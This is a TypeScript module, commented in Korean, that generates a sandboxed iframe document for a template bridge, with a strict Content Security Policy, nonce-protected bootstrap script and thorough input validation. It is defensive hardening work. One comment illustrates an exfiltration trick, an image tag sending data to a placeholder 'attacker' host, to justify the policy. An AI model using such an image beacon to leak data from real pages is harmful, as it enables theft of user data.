import { isValidNonce, isValidSession } from '../protocol/session.js'
import { bridgeRuntime } from '../frame/runtime.js'
import { createBridgeFetch } from '../frame/createBridgeFetch.js'
import { installDirectFetch } from '../frame/directFetch.js'
import { escapeHtml, toScriptLiteral } from './escape.js'
import { normalizeExactOrigin } from '../host/policy.js'

export interface CreateSrcdocOptions {
  /** 부트스트랩 스크립트 CSP nonce(`createNonce()`). */
  readonly nonce: string
  /** 프레임 세션(`createSession()`). */
  readonly session: string
  /** 호스트 페이지 origin. 프레임 → 호스트 postMessage의 targetOrigin. */
  readonly hostOrigin: string
  /** 템플릿 번들 CDN origin. CSP script·style·img·font·media 허용 대상. */
  readonly assetOrigin: string
  /** 템플릿 엔트리 스크립트 URL. origin이 assetOrigin이어야 한다. */
  readonly entryUrl: string
  /** 템플릿이 등록하는 custom element 이름. */
  readonly elementName: string
  /** 문서 제목(placement 이름). */
  readonly title: string
  /**
   * 템플릿이 이미지·미디어를 불러올 추가 origin(정확한 https origin, 최대 `MAX_MEDIA_ORIGINS`개).
   * CSP img-src·media-src에만 더해진다. 잘못된 항목이 하나라도 있으면 TypeError.
   */
  readonly mediaOrigins?: readonly string[]
}

/** mediaOrigins 최대 개수. */
export const MAX_MEDIA_ORIGINS = 20

/** elementName 최대 길이. 정규식 앞에서 먼저 잘라 입력 크기를 고정한다. */
export const MAX_ELEMENT_NAME_LENGTH = 100

/**
 * custom element 이름 규칙(소문자 시작, 하이픈 포함, 안전 문자만).
 *
 * 첫 하이픈 앞 구간은 `-`를 빼서 첫 `-`의 위치가 하나로 정해지게 한다 — 같은 문자 클래스의 무한 반복 둘이
 * `-`를 사이에 두면(`[a-z0-9._-]*-[a-z0-9._-]*`) 실패 입력에서 분할점을 모두 시도해 이차 시간이 된다.
 * 받는 문자열 집합은 이전 식과 같다(`a-`·`a--b` 포함).
 */
const ELEMENT_NAME_RE = /^[a-z][a-z0-9._]*-[a-z0-9._-]*$/

function isValidElementName(value: unknown): value is string {
  return (
    typeof value === 'string' &&
    value.length <= MAX_ELEMENT_NAME_LENGTH &&
    ELEMENT_NAME_RE.test(value)
  )
}

/**
 * `scheme://host[:port]` 정확한 origin인지(경로·쿼리·userinfo 없음, 호스트에 `*`·`;` 등 없음).
 * CSP 소스로 들어가므로 와일드카드·지시어 구분자가 섞이면 정책이 넓어진다.
 */
function assertOrigin(label: string, value: string): string {
  const origin = normalizeExactOrigin(value, ['https:', 'http:'])
  if (!origin) throw new TypeError(`[bstage-bridge] ${label}는 정확한 origin이어야 합니다`)
  return origin
}

function assertEntryUrl(entryUrl: string, assetOrigin: string): string {
  let parsed: URL
  try {
    parsed = new URL(entryUrl)
  } catch {
    throw new TypeError('[bstage-bridge] entryUrl이 URL이 아닙니다')
  }
  if (parsed.origin !== assetOrigin || parsed.username || parsed.password) {
    throw new TypeError('[bstage-bridge] entryUrl은 assetOrigin에 있어야 합니다')
  }
  return parsed.href
}

/**
 * mediaOrigins를 검증한다 — 정확한 https origin만(경로·쿼리·userinfo·와일드카드·대문자 호스트 거절),
 * 최대 `MAX_MEDIA_ORIGINS`개, 중복 제거. 조용히 버리지 않고 하나라도 틀리면 던진다
 * (CSP 소스로 들어가므로 잘못된 값이 정책을 넓히거나 지시어를 끊으면 안 된다).
 */
function normalizeMediaOrigins(value: unknown): readonly string[] {
  if (value === undefined) return Object.freeze([])
  if (!Array.isArray(value)) {
    throw new TypeError('[bstage-bridge] mediaOrigins는 배열이어야 합니다')
  }
  if (value.length > MAX_MEDIA_ORIGINS) {
    throw new TypeError(`[bstage-bridge] mediaOrigins는 최대 ${MAX_MEDIA_ORIGINS}개입니다`)
  }
  const origins = value.map((o: unknown) => {
    const origin = normalizeExactOrigin(o, ['https:'])
    if (!origin) {
      throw new TypeError('[bstage-bridge] mediaOrigins 항목은 정확한 https origin이어야 합니다')
    }
    return origin
  })
  return Object.freeze([...new Set(origins)])
}

/**
 * 브리지 프로토콜 CSP. 값은 이스케이프 전 원문(호출자가 속성에 넣을 때 이스케이프).
 *
 * connect-src는 항상 `https: wss:`다(프레임 네트워크 규칙, README "프레임 네트워크") — 토큰이 필요한 API는
 * 부트스트랩의 `__bstage_fetch__`가 브리지로 보내고, 그 밖의 https API는 템플릿이 직접 부른다. 평문(`http:`·`ws:`)은 열지 않는다.
 *
 * img-src·media-src에 맨 `https:`를 두지 않는다 — 두면 템플릿이 `<img src="https://attacker/?d=...">`로
 * 임의 origin에 GET을 보낼 수 있다. 외부 이미지·미디어는 `mediaOrigins`로 정확한 origin만 연다.
 *
 * @throws TypeError mediaOrigins가 형식에 맞지 않을 때
 */
export function buildFrameCsp(
  nonce: string,
  assetOrigin: string,
  mediaOrigins: readonly string[] = [],
): string {
  const media = [assetOrigin, ...normalizeMediaOrigins(mediaOrigins)].join(' ')
  return [
    "default-src 'none'",
    `script-src 'nonce-${nonce}' ${assetOrigin}`,
    `style-src 'unsafe-inline' ${assetOrigin}`,
    `img-src ${media} data: blob:`,
    `font-src ${assetOrigin} data:`,
    `media-src ${media} blob:`,
    'connect-src https: wss:',
    "frame-src 'none'",
    "form-action 'none'",
    "base-uri 'none'",
  ].join('; ')
}

/**
 * 부트스트랩 본문 — 런타임 설치 → init 대기 → 엔트리 로드 → custom element 마운트 → 높이 보고.
 *
 * 엔트리는 **init을 받은 뒤** 로드한다. 그래야 템플릿 모듈 최상단에서 만든 `BstageClient`가
 * init의 `gatewayBase`로 baseUrl을 정하고, 첫 렌더의 locale이 init 값이 된다.
 */
function bootstrapScript(o: {
  session: string
  hostOrigin: string
  entryUrl: string
  elementName: string
}): string {
  return [
    '(function () {',
    '"use strict";',
    `var SESSION = ${toScriptLiteral(o.session)};`,
    `var HOST_ORIGIN = ${toScriptLiteral(o.hostOrigin)};`,
    `var ENTRY_URL = ${toScriptLiteral(o.entryUrl)};`,
    `var ELEMENT_NAME = ${toScriptLiteral(o.elementName)};`,
    `var bridgeRuntime = ${bridgeRuntime.toString()};`,
    `var createBridgeFetch = ${createBridgeFetch.toString()};`,
    'var client = bridgeRuntime(globalThis, createBridgeFetch, { session: SESSION, hostOrigin: HOST_ORIGIN });',
    // 라우터는 항상 심는다. ready.then이 엔트리 로드(아래 client.ready.then)보다 먼저 등록돼야 템플릿보다 먼저 스냅샷을 잡는다.
    `var installDirectFetch = ${installDirectFetch.toString()};`,
    'installDirectFetch(globalThis, client, { hostOrigin: HOST_ORIGIN });',
    'var lastHeight = -1;',
    'var scheduled = false;',
    'function reportHeight() {',
    '  scheduled = false;',
    '  var h = Math.ceil(document.body.getBoundingClientRect().height);',
    '  if (h === lastHeight) return;',
    '  lastHeight = h;',
    "  client.request('resize', { height: h }).catch(function () {});",
    '}',
    'function scheduleHeight() {',
    '  if (scheduled) return;',
    '  scheduled = true;',
    '  requestAnimationFrame(reportHeight);',
    '}',
    'client.ready.then(function () {',
    "  var script = document.createElement('script');",
    '  script.src = ENTRY_URL;',
    '  script.onerror = function () {',
    "    client.request('log', { level: 'error', message: 'template entry failed to load' }).catch(function () {});",
    '  };',
    '  document.head.appendChild(script);',
    '  customElements.whenDefined(ELEMENT_NAME).then(function () {',
    '    document.body.appendChild(document.createElement(ELEMENT_NAME));',
    "    if (typeof ResizeObserver === 'function') {",
    '      new ResizeObserver(scheduleHeight).observe(document.body);',
    '    }',
    '    scheduleHeight();',
    '  });',
    '}, function () {});',
    '})();',
  ].join('\n')
}

/**
 * 격리 프레임의 srcdoc 문서를 만든다. 모든 보간 값은 검증하고 문맥에 맞게 이스케이프한다
 * (HTML 속성·텍스트는 HTML 이스케이프, 스크립트 안은 JSON + `<`·`>`·`&` 유니코드 이스케이프).
 *
 * iframe 속성은 `IFRAME_ATTRIBUTES`(sandbox="allow-scripts" 등)를 쓴다.
 *
 * @throws TypeError 입력이 형식에 맞지 않을 때(잘못된 nonce·세션·origin·엔트리·요소 이름·mediaOrigins)
 */
export function createSrcdoc(options: CreateSrcdocOptions): string {
  const { nonce, session, title, elementName } = options
  if (!isValidNonce(nonce)) throw new TypeError('[bstage-bridge] nonce 형식이 잘못됐습니다')
  if (!isValidSession(session)) throw new TypeError('[bstage-bridge] session 형식이 잘못됐습니다')
  const hostOrigin = assertOrigin('hostOrigin', options.hostOrigin)
  const assetOrigin = assertOrigin('assetOrigin', options.assetOrigin)
  const entryUrl = assertEntryUrl(options.entryUrl, assetOrigin)
  if (!isValidElementName(elementName)) {
    throw new TypeError('[bstage-bridge] elementName이 custom element 이름이 아닙니다')
  }
  if (typeof title !== 'string') throw new TypeError('[bstage-bridge] title은 문자열이어야 합니다')
  const mediaOrigins = normalizeMediaOrigins(options.mediaOrigins)

  const csp = buildFrameCsp(nonce, assetOrigin, mediaOrigins)
  const script = bootstrapScript({ session, hostOrigin, entryUrl, elementName })
  // 보간 값은 위에서 이스케이프했으므로, 걸린다면 런타임 소스(toString) 쪽 문제다 — 조용히 내보내지 않는다.
  if (/<\/script|<!--/i.test(script)) {
    throw new Error('[bstage-bridge] 부트스트랩 스크립트에 스크립트 종료 시퀀스가 있습니다')
  }

  return [
    '<!doctype html>',
    '<html>',
    '<head>',
    '<meta charset="utf-8">',
    `<meta http-equiv="Content-Security-Policy" content="${escapeHtml(csp)}">`,
    '<meta name="viewport" content="width=device-width, initial-scale=1">',
    `<title>${escapeHtml(title)}</title>`,
    // body 높이를 콘텐츠 높이로 잰다 — documentElement.scrollHeight는 뷰포트 이상이라 줄어들지 못한다.
    // flow-root는 자식 margin이 body 밖으로 접혀 나가 높이에서 빠지는 것을 막는다.
    '<style>html,body{margin:0;padding:0;background:transparent;height:auto}body{display:flow-root}</style>',
    `<script nonce="${escapeHtml(nonce)}">\n${script}\n</script>`,
    '</head>',
    '<body></body>',
    '</html>',
  ].join('\n')
}
